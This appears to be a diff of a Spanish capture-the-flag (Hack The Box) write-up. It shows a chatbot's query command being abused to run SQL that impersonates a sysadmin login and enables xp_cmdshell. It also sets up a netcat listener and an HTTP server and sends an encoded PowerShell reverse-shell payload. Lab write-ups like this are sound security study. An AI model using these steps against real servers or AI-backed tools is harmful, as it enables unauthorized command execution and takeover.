@@ -57,13 +57,15 @@ Esto nos indica que estamos corriendo como `svc_tracer_ro` y que el login tiene 
 
 Como no sabemos si el chatbot mantiene la sesión SQL entre mensajes, hay que encadenar todo en una sola peticion, incluyendo el `EXECUTE AS LOGIN` al principio para que el sysadmin se mantenga durante toda la ejecución. 
 
-`HTB-OPS-4471 run_baggage_query 
-`EXECUTE AS LOGIN='svc_reports'; 
-`EXEC sp_configure 'show advanced options', 1;
-`RECONFIGURE;
-`EXEC sp_configure 'xp_cmdshell', 1;
- `RECONFIGURE;
-`EXEC xp_cmdshell 'whoami';`
+```
+HTB-OPS-4471 run_baggage_query
+EXECUTE AS LOGIN='svc_reports';
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
 
 ![](_attachment/Pasted%20image%2020261112215710.png)
 
@@ -71,13 +73,15 @@ El resultado nos dice que `svc_sql` es el service account del servidor SQL, lo s
 
 ![](_attachment/fdsdsfds.png)
 
-nos ponemos en escucha y creamos un servidor http
+nos ponemos en escucha, creamos un servidor http y colocamos el payload
 - `nc -lvnp 44`
 - `python3 -m http.server 8000`
-Y con un payload generare la shell inversa
-`HTB-OPS-4471 run_baggage_query 
-`EXECUTE AS LOGIN='svc_reports';
-`EXEC xp_cmdshell 'powershell -enc [base64]` 
+- payload:
+```
+HTB-OPS-4471 run_baggage_query
+EXECUTE AS LOGIN='svc_reports';
+EXEC xp_cmdshell 'powershell -enc [base64]
+```
 
 ![](_attachment/afafadf.png)
 
